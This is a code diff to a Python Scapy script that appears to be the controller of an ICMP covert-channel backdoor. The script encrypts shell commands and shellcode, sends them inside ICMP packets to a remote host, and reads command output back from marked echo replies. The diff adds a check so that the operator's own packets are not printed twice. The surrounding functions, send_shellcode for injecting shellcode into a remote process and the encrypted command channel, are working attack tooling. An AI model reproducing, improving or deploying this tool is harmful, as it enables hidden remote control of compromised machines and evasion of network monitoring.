@@ -6,6 +6,7 @@ import getopt
 ######global args#######
 cmdout = []
 outputdelay = (200.0 / 1000.0)
+last_packet = None
 
 
 ########## functions ############
@@ -69,6 +70,7 @@ def crypt_data(data, key):
    return encrypted_data
 
 def build_pkt(src, dst, data, key_info):
+
    ip = IP(dst=dst)
 
    if src_ip:
@@ -78,18 +80,20 @@ def build_pkt(src, dst, data, key_info):
 
 def sniff_packet(pkt):
    global magic 
+   global last_packet
 
    if ICMP in pkt and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
       data = crypt_data(pkt.load, generate_key(pkt[ICMP].id))
 
       if data.startswith(magic):
-         print data[len(magic) + 1:]
+         if pkt.load != last_packet:
+            print data[len(magic) + 1:]
 
 def start_listener(iface, *args):
    sniff(filter="icmp", iface=iface, prn=sniff_packet)
 
 def send_shellcode():
-   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, iface, shellcode_file, pid
+   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, iface, shellcode_file, pid, last_packet
    shellcode = ''
 
    if pid != 0:
@@ -109,6 +113,7 @@ def send_shellcode():
    key_info = generate_key_info()
    key = generate_key(key_info)
    encrypted_data = crypt_data(shellcode, key)
+   last_packet = encrypted_data
 
    # Now send it
    send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
@@ -156,9 +161,12 @@ thread.start_new_thread(start_listener, (iface, None))
 def cmdoutput(line):
    global cmdout
    global outputdelay
+   global last_packet
+
    key_info = generate_key_info()
    key = generate_key(key_info)
    encrypted_data = crypt_data(magic + "\x02" + line, key)
+   last_packet = encrypted_data
    send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
    
    len1 = len(cmdout)
@@ -186,9 +194,11 @@ def cmdoutput(line):
 def cmdoutputnoprint(line):
    global cmdout
    global outputdelay
+   global last_packet
    key_info = generate_key_info()
    key = generate_key(key_info)
    encrypted_data = crypt_data(magic + "\x02" + line, key)
+   last_packet = encrypted_data
    send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
 
    len1 = len(cmdout)
